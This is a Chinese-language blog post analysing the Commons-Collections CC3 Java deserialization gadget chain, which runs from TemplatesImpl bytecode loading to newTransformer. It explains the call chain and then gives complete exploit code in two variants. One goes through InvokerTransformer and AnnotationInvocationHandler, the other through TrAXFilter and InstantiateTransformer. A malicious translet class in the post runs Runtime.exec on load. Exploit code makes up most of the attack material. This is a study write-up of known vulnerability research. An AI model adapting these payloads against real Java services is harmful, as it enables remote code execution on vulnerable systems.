---
layout: post
title: Commons-Collection CC3链
tags: Java
---

# 链分析：

CC3是利用动态类加载执行任意代码。

利用点是`defineClass`方法。`defineClass`调用`newInstance `进行初始化执行任意代码

一般`defineClass`都是 protected类型的，要调用`defineClass`不能用protected方法。全局查找`definClass`方法找到

`TemplatesImpl`类中调用了`defineClass`方法,没有修饰符默认是default方法。

![1726466066821.jpg](\images\posts\Commons-Collection CC3链\1726466066821.jpg)

再查找谁调用了`defineClass`。`TemplatesImpl`下的`defineTransletClasses`调用了`defineClass`

![1726466892495.jpg](\images\posts\Commons-Collection CC3链\1726466892495.jpg)

`defineTransletClasses`是一个私有方法，继续查找调用。找到了`getTransletInstance`方法,调用了`defineTransletClasses`方法，还顺带调用了`newInstance`.所以重点关注`getTransletInstance`函数

![1726467523849.jpg](\images\posts\Commons-Collection CC3链\1726467523849.jpg)

`getTransletInstance`也是一个私有方法，继续查找调用。最后查找到`newTransformer`类里面调用了`getTransletInstance`方法，这个类是公有的，链子到这里结束。

![1726467694276.jpg](\images\posts\Commons-Collection CC3链\1726467694276.jpg)

`defineClass`<==`defineTransletClasses`<==`getTransletInstance`<==`newTransformer`

跟进`getTransletInstance`，要调用`defineTransletClasses`_name不能为null, _class必须为null

![1726468331019.jpg](\images\posts\Commons-Collection CC3链\1726468331019.jpg)

跟进`defineTransletClasses`，_bytecodes不能等于null，否则报错。 _tfactory会调用`getExternalExtensionsMap`要有值

## EXP编写

通过反射给_name、 _bytecodes、 _tfactory。 _name是String类型， _bytecodes是二维数组

![1726468819678.jpg](\images\posts\Commons-Collection CC3链\1726468819678.jpg)

但是defineClass调用传递的值是一维数组，用for循环遍历进去

![1726469527117.jpg](\images\posts\Commons-Collection CC3链\1726469527117.jpg)

所以可以嵌套进去

```
byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
byte[][] codes = {code};
```

_tfactory是transient类型，就是不能被序列化，反射修改后也不会被序列化进去

![1726469798573.jpg](\images\posts\Commons-Collection CC3链\1726469798573.jpg)

所以肯定在readObject里面传了值

![1726470193619.jpg](\images\posts\Commons-Collection CC3链\1726470193619.jpg)

这里方便调试一下先给_tfactory赋值new TransformerFactoryImpl()

```
public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();

    }
}

```

这里报错空指针异常，打断点调试

![1726470779133.jpg](\images\posts\Commons-Collection CC3链\1726470779133.jpg)

类加载成功,`_auxClasses`为null导致的错误

![1726470898807.jpg](\images\posts\Commons-Collection CC3链\1726470898807.jpg)

因为上面看到`_transletIndex`值是-1，下面有判断如果`transletIndex`小于0就报错，所以只能让它equals ABSTRACT_TRANSLET。

```
private static String ABSTRACT_TRANSLET="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"
```

执行代码的类导入这个类，`AbstractTranslet`是个抽象方法，重写他的两个方法。最后的恶意类就是

```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class ClassLoaderTest extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

![1726471489931.jpg](\images\posts\Commons-Collection CC3链\1726471489931.jpg)

CC1可以执行任意方法，通过CC1调用`TemplatesImpl`的`newTransformer`方法

## 最终的EXP:

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

//        Field tfactoryField = c.getDeclaredField("_tfactory");
//       tfactoryField.setAccessible(true);
//        tfactoryField.set(templates,new TransformerFactoryImpl());
//
//        templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer); 

        Class tc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = tc.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![1726472172428.jpg](\images\posts\Commons-Collection CC3链\1726472172428.jpg)

# 另一条条链子

 上面的链是`InvokerTransformer` 类的 `transformer` 调用了 `TemplateImpl` 类的 `newTransformer()` 方法执行，再找一个方法调用`newTransformer`方法。

![1726474429642.jpg](\images\posts\Commons-Collection CC3链\1726474429642.jpg)

这里找到了`TrAXFilter`类，并且调用了`newTransformer`方法，但是`TrAXFilter`不能序列化，只有找一个能被序列化的对象来调用这个构造器。这里找到了`InstantiateTransformer`的`transform`方法

![1726474863076.jpg](\images\posts\Commons-Collection CC3链\1726474863076.jpg)

## EXP

```java
public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

//        Field tfactoryField = c.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);  //TrAXFilter不能序列化但是class可以序列化

//
//        templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class tc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = tc.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```







